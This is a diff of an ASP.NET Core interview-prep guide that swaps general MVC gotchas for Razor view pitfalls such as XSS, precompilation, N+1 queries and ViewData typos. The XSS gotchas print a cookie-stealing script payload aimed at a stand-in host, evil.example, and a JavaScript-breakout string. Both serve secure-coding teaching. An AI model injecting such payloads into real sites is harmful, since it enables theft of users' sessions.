@@ -291,188 +291,149 @@ The view engine cannot locate a matching `.cshtml` file or precompiled view type
 
 ---
 
-## Gotchas — ASP.NET Core MVC (Interview Traps)
-
-#### Gotcha 1. Business logic in Razor views
-
-**Concepts**
-- Pricing and discount calculations in `.cshtml` — no unit test coverage
-- Authorization checks in Razor — bypassable by alternate routes
-
-**Answer**
-
-Placing pricing, discount, authorization, or business rules in `.cshtml` files bypasses unit tests, duplicates service-layer logic, and makes behavior hard to change consistently. Views should render data the controller or ViewModel already prepared. Calculations in Razor cannot be tested independently and often diverge from API or batch logic. Razor should be limited to presentation formatting, not business decisions.
+## Gotchas — Views & Razor Syntax (Interview Traps)
 
 ---
 
-#### Gotcha 2. EF entities passed directly to views
+#### Gotcha 1. `@Html.Raw` with unsanitized user content enabling stored XSS
 
 **Concepts**
-- Lazy-loaded navigations — unexpected queries during rendering
-- Over-posting — mass assignment via unlocked navigation properties
+- Default `@expression` — HTML-encodes all output, prevents script injection
+- `@Html.Raw` — bypasses encoding, renders attacker-supplied markup verbatim
+- Stored XSS — malicious script in database executes for every subsequent viewer
+- Allowlist HTML sanitizer — required before `Raw` for intentional rich text
 
 **Answer**
 
-Binding and displaying EF Core entities exposes navigation properties, causes over-posting on POST, and couples the UI to the database schema. Lazy-loaded navigations can trigger unexpected queries during rendering and mass assignment can update properties the user should not control such as `IsAdmin`. The fix is dedicated ViewModels with only the fields the view needs.
+`@Html.Raw(comment.Body)` renders whatever is stored in the database directly into the page. If an attacker posted `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` as a comment, every subsequent viewer's browser executes it — stored XSS affecting all users. The default `@comment.Body` syntax HTML-encodes the output and is safe for plain text. For intentional rich text where bold and links are allowed, sanitize server-side on write using an allowlist HTML sanitizer (for example HtmlSanitizer / Ganss.XSS) that strips `<script>`, event-handler attributes, and `javascript:` URLs, then store the sanitized result. Only the sanitized output is safe for `@Html.Raw`.
 
 ---
 
-#### Gotcha 3. `[FromBody]` on HTML form POST
+#### Gotcha 2. HTML encoding context does not protect inside JavaScript string literals
 
 **Concepts**
-- Browser forms — `application/x-www-form-urlencoded`, not JSON
-- `[FromBody]` uses JSON input formatter — leaves model empty silently
+- HTML context encoding — escapes `<`, `>`, `&`, `"` for HTML body and attribute text
+- JavaScript string literal context — single quotes, semicolons, parentheses not encoded by HTML encoder
+- Inline `onclick` handler — breaks out of `'...'` string on `'); alert();//` sequence
+- `data-*` attributes + `dataset` — correct server-to-client data bridge
 
 **Answer**
 
-Standard browser forms send `application/x-www-form-urlencoded`, not JSON. `[FromBody]` uses the JSON input formatter and leaves the model empty while the action runs with default values. I remove `[FromBody]` for conventional form POSTs and use it only when the client sends JSON with the correct Content-Type.
+`<button onclick="track('@Model.UserName')">` HTML-encodes `@Model.UserName`, which converts `<` and `>` but leaves single quotes, semicolons, and parentheses intact because they are valid HTML characters. A user name of `'); alert(document.cookie);//` breaks out of the `'...'` string in the event handler and executes arbitrary script. The correct approach is to pass server data via `data-*` attributes and read them in an external script: `<button data-user="@Model.UserName">` with `element.dataset.user` in JavaScript. Alternatively, use `@Json.Serialize(Model.UserName)` inside a `<script>` block — the JSON encoder handles all escaping needed for JavaScript string literals.
 
 ---
 
-#### Gotcha 4. Skipping `ModelState.IsValid` because of client validation
+#### Gotcha 3. Business logic and pricing rules inside `@{}` code blocks
 
 **Concepts**
-- Client-side validation — bypassable by direct POST
-- Server-side `ModelState.IsValid` — mandatory security gate
+- `@{}` block — execution context for presentation helpers only (CSS class mappers, formatters)
+- Business logic in view — untestable, diverges from API, service-layer, and batch code paths
+- Hardcoded constants in Razor — require redeployment to change; invisible to config management
+- Controller enrichment — computed values set on ViewModel before `return View(model)`
 
 **Answer**
 
-Client-side validation is bypassable by direct POST. Server-side validation is mandatory before any persist, redirect, or side effect. I always gate POST actions with `if (!ModelState.IsValid) return View(model);`. Missing server validation is a security defect regardless of client script presence.
+Pricing calculations, discount rules, and tax rate formulas in `@{}` blocks are untested by service-layer unit tests and run on a code path separate from API, PDF generation, email, and batch calculations. When a tax rate changes, the service is updated and tests pass — but the view still uses the hardcoded rate until someone notices wrong totals in the browser. Business calculations belong in a domain service or controller enrichment step that populates computed fields on the ViewModel. The view then renders `@Model.LineTotal.ToString("C")` with no math of its own. Hardcoded rates in `.cshtml` require a redeployment to change, whereas a configuration-backed service can be updated without touching view code.
 
 ---
 
-#### Gotcha 5. `return View()` after successful POST
+#### Gotcha 4. `@model` directive type mismatch between action and view
 
 **Concepts**
-- Browser refresh after `return View()` — resubmits POST body
-- PRG — `return RedirectToAction` after successful mutation
+- `@model ProductViewModel` — declares the expected model type; enables IntelliSense
+- `return View(new OrderViewModel())` — `InvalidOperationException` at render time when types mismatch
+- Precompilation — Razor SDK catches type mismatches at `dotnet publish -c Release`
+- `@model dynamic` or `@model object` — defeats type checking, hides mismatches indefinitely
 
 **Answer**
 
-Returning the same view after a successful POST causes duplicate submission when the user refreshes the page. The fix is Post-Redirect-Get: `return RedirectToAction(nameof(Index))` after successful create or update. Flash success messages go via TempData on the redirect target.
+The `@model ProductViewModel` directive tells the Razor compiler what type to expect and enables strongly typed `@Model.Name` access. When the action passes `return View(new OrderViewModel())` to a view expecting `ProductViewModel`, an `InvalidOperationException` fires at runtime during view rendering — the error only surfaces when that specific route is hit. Using `@model dynamic` or `@model object` hides this class of mismatch indefinitely because the cast always succeeds at the declaration site. Running `dotnet publish -c Release` in CI catches type mismatches at build time because the Razor SDK generates strongly typed view classes. Every view should have a concrete `@model` declaration matching exactly what the controller passes.
 
 ---
 
-#### Gotcha 6. `ModelState` after redirect
+#### Gotcha 5. `@inject AppDbContext` and EF queries inside views causing N+1
 
 **Concepts**
-- `ModelState` — request-scoped, does not survive redirect
-- On failure — `return View(model)` with errors inline
+- `@inject` in Razor — resolves any registered service directly into the view
+- EF query inside view — runs during rendering, outside controller profiling span
+- N+1 pattern — one DB query per row when a service-injected partial renders in a loop
+- View Component or controller data loading — the correct location for all I/O
 
 **Answer**
 
-`ModelState` is request-scoped and does not survive `RedirectToAction`. The correct pattern is to redirect only on success and on validation failure return `View(model)` with errors inline. To survive redirect on failure, serialize errors to TempData or use PRG with a form-specific error cache.
+`@inject AppDbContext Db` followed by `await Db.Products.Where(...).ToListAsync()` inside a view or `@functions` block puts database I/O in the rendering pipeline, invisible to controller profiling spans. If a pricing partial that queries the service is rendered once per row in a 200-row loop, 200 individually awaited queries fire during rendering — an N+1 hidden inside markup. The fix is to load all data in the controller action before `return View(model)` and pass precomputed values in the ViewModel. Use a View Component for reusable widgets that need independent data loading — it has its own `InvokeAsync` method, giving proper control over when data is fetched.
 
 ---
 
-#### Gotcha 7. TempData read twice in layout and view
+#### Gotcha 6. `AddRazorRuntimeCompilation` enabled in production
 
 **Concepts**
-- TempData consumed on first read by default
-- `TempData.Peek` — read without consuming
+- `AddRazorRuntimeCompilation` — Roslyn file-watcher recompiles `.cshtml` on every disk change
+- No `IsDevelopment()` guard — activates in all environments including Production
+- Security risk — unauthorized `.cshtml` edit on server runs arbitrary C# in the process
+- Precompiled views — correct Production approach; views in DLL, not on disk at runtime
 
 **Answer**
 
-TempData is consumed on first read by default. If the layout reads a flash message, the view sees nothing unless `Peek()` or `Keep()` is used. I prefer a single consumption point — typically the layout or a dedicated partial, not both. Cookie-based TempData has size limits.
+`AddRazorRuntimeCompilation()` without an `IsDevelopment()` guard activates in Production and Staging. It watches `.cshtml` files on disk and recompiles them on change, so edits on the live server apply immediately without redeployment. In Production this creates three problems: Roslyn compile overhead on cache misses, operational drift when files differ between server nodes, and a security vulnerability — if an attacker can write to the views directory, a modified `.cshtml` runs arbitrary C# logic in the application process. The fix: `if (builder.Environment.IsDevelopment()) mvc.AddRazorRuntimeCompilation();`. Production relies on precompiled views from the CI publish artifact.
 
 ---
 
-#### Gotcha 8. Missing `[Area]` attribute on area controllers
+#### Gotcha 7. View not found after publish due to precompilation failure or Linux case sensitivity
 
 **Concepts**
-- `[Area("AreaName")]` — required for area route discovery
-- Without attribute — controller treated as root, returns 404
+- `dotnet run` — uses project `Views/` source directory on disk
+- `dotnet publish` Release — produces `ProjectName.Views.dll`, no `.cshtml` needed
+- Missing `Views.dll` — silent failure from `<Content Remove="Views/**" />` in `.csproj`
+- Linux case sensitivity — `Index.cshtml` and `index.cshtml` are different files on Linux servers
 
 **Answer**
 
-Controllers in `Areas/Admin/Controllers` without `[Area("Admin")]` are not discovered by the areas route and return 404 or match the wrong route. Every area controller must declare `[Area("AreaName")]` matching its folder. Area routing is registered separately with the `{area:exists}` constraint.
+`InvalidOperationException: The view 'Index' was not found` in Production while `dotnet run` works locally means a mismatch between the publish artifact and the view name. In a Release publish, the Razor SDK compiles all `.cshtml` files into `ProjectName.Views.dll` — if that assembly is missing from `./out`, a `.csproj` exclusion like `<Content Remove="Views/**" />` stripped the source before compilation. A second common cause is Linux case sensitivity: Windows allows `Index.cshtml` to match `return View("index")` but Linux does not. To verify: run `dotnet publish -c Release` locally and start the app from the output directory — if it fails there it will fail in Production, and the `Views.dll` presence can be confirmed immediately.
 
 ---
 
-#### Gotcha 9. Link generation without `asp-area`
+#### Gotcha 8. Duplicate markup across views instead of extracting a partial
 
 **Concepts**
-- Tag Helpers — default to current area context
-- Cross-area links — require explicit `asp-area` and `asp-controller`
+- Duplicated `@{}` blocks — each view maintains its own copy, bugs diverge independently
+- Partial view — single `_StatusBadge.cshtml` with typed `StatusBadgeViewModel`
+- View Component — correct choice when the widget needs independent data loading
+- Tag Helper — per-attribute customization rendered as a standard HTML element
 
 **Answer**
 
-Tag Helpers default to the current area context when generating URLs. Links from a root view to an area controller need explicit `asp-area="Admin"` or they generate URLs without the area segment. Cross-area links require both `asp-area` and `asp-controller`. The same rule applies to `Url.Action` with `new { area = "Admin" }` in route values.
+Copy-pasting a 20-line status-badge block across five views creates five divergent code paths where a bug fix in one does not automatically propagate to the others. The fix is a partial view `_StatusBadge.cshtml` accepting a typed model with all required properties, replacing every duplicated block with `<partial name="_StatusBadge" model="new StatusBadgeViewModel {...}" />`. The switch and conditional logic live only in the partial and are covered by a single unit test. A View Component is preferable when the badge also loads its own data independently; a Tag Helper is preferable when the customization is purely per-attribute HTML rendering. The selection criterion is where the data comes from, not how complex the markup is.
 
 ---
 
-#### Gotcha 10. Checkbox `[Required]` on non-nullable `bool`
+#### Gotcha 9. Magic string `ViewData` keys producing silent null fallback
 
 **Concepts**
-- Unchecked checkbox posts nothing — model binding sets `bool` to `false`
-- `[Required]` on `bool` never fails — `false` is a valid non-null value
+- `ViewData["Title"]` — untyped dictionary; typo silently writes to a different key
+- `ViewData["Titel"]` — completely unrelated entry, no compile-time check on either side
+- `as string ?? "default"` — hides the null from the missing key silently
+- Shared constant, `[ViewData]` property, or typed ViewModel — compile-time alternatives
 
 **Answer**
 
-An unchecked checkbox posts nothing and model binding sets a non-nullable `bool` to `false`. `[Required]` never fails because `false` is a valid value. I use `bool?` with `[Required]` to require explicit true selection for consent checkboxes.
+`ViewData` is a string-keyed dictionary with no compile-time check. A controller writing `ViewData["Titel"] = "About Us"` and a layout reading `ViewData["Title"]` are completely disconnected — the typo writes to a different key and the layout silently falls back to the app name. This "intermittent blank title" only surfaces during manual testing of the specific route. A shared constants class `ViewDataKeys.Title` used in both controller and layout ensures the string is defined once. Better still: use a typed ViewModel with a `Title` property and reference `@Model.Title` in the layout — no magic strings, full IntelliSense, compiler-checked renames.
 
 ---
 
-#### Gotcha 11. Collection binding with gap indices
+#### Gotcha 10. Computation inside `@{}` blocks executing on every render with no caching
 
 **Concepts**
-- Model binder expects contiguous zero-based indices
-- Gap indices — truncation or misalignment after row deletion
+- `@{}` block — executes C# synchronously on every request during rendering
+- Heavy aggregation in view — no cache layer, repeated per concurrent request
+- View caching — not built in for Razor; data must be cached at service or controller level
+- `IMemoryCache` or `IDistributedCache` — correct caching layer before data reaches the view
 
 **Answer**
 
-Deleting a form row leaving indices such as `Lines[0]` and `Lines[2]` breaks model binder alignment. I reindex client-side after row deletion so indices are contiguous starting at zero, or implement a custom `IModelBinder` that tolerates non-contiguous indices.
+Code inside `@{}` blocks runs on every request that renders the view — there is no per-view output caching in standard MVC Razor. A heavy aggregation or formatting computation in `@{}` that takes 50ms adds 50ms to every page render for every concurrent user. Caching belongs at the service or controller layer where `IMemoryCache` or `IDistributedCache` can be used before the data is passed to the view. The `[ResponseCache]` attribute caches full HTTP responses but requires careful cache-key design for user-specific pages. If a partial's data changes infrequently, the controller should cache the precomputed ViewModel and pass the cached object to the view rather than recomputing on each request.
 
 ---
-
-#### Gotcha 12. `@Html.Raw` with user content
-
-**Concepts**
-- Default Razor `@` — HTML-encodes, prevents XSS
-- `@Html.Raw` — bypasses encoding, executes injected script
-
-**Answer**
-
-Default Razor encoding prevents XSS. `@Html.Raw(Model.UserComment)` renders attacker-supplied script if the content is not sanitized server-side. I prefer `@Model.UserComment` (auto-encoded) for plain text or sanitize with a trusted HTML sanitizer library before using Raw.
-
----
-
-#### Gotcha 13. AJAX POST without antiforgery token
-
-**Concepts**
-- Form tag helpers — emit antiforgery token automatically
-- `fetch` / jQuery AJAX — must send token manually
-
-**Answer**
-
-Form tag helpers emit antiforgery tokens automatically but `fetch` and jQuery AJAX must manually send `RequestVerificationToken` as a header or form field. `[AutoValidateAntiforgeryToken]` on the controller validates all unsafe verb methods. I do not disable antiforgery on MVC cookie-auth endpoints — I add the token instead.
-
----
-
-#### Gotcha 14. Injecting Hub into MVC controller
-
-**Concepts**
-- Hubs not registered in DI for direct injection
-- `IHubContext<THub>` — singleton proxy for broadcasting
-
-**Answer**
-
-Hubs are not registered in DI for direct injection. Injecting a concrete `Hub` fails activation or produces an instance without connection context. The correct pattern is `IHubContext<THub>`, which is a singleton proxy registered by `AddSignalR()`.
-
----
-
-#### Gotcha 15. SignalR scale-out without backplane
-
-**Concepts**
-- Sticky sessions — per-client affinity, not cross-instance event routing
-- `AddStackExchangeRedis` or `AddAzureSignalR` — multi-instance fan-out
-
-**Answer**
-
-Sticky sessions alone do not fan-out events across server instances. A controller on instance A calling `IHubContext.Clients.User(id).SendAsync` misses users on instance B. Multi-node deployments need `AddStackExchangeRedis` or `AddAzureSignalR`.
-
----
-
 ## Scenario-Based Questions (Karat Format)
 
 #### Q1. (R) A product review page renders user-submitted comments. QA passes with test data; security scan flags stored XSS. Review this Razor fragment — what is wrong and how do you fix it without breaking allowed rich text?
